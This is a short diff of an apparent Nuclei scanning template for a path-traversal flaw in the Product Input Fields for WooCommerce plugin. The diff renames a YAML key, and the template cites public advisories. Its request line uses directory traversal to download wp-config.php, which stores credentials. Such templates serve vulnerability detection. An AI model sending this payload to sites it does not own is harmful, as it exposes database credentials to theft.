@@ -10,7 +10,7 @@ info:
     - https://wpscan.com/vulnerability/15f345e6-fc53-4bac-bc5a-de898181ea74
     - https://blog.nintechnet.com/high-severity-vulnerability-fixed-in-product-input-fields-for-woocommerce/
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php'
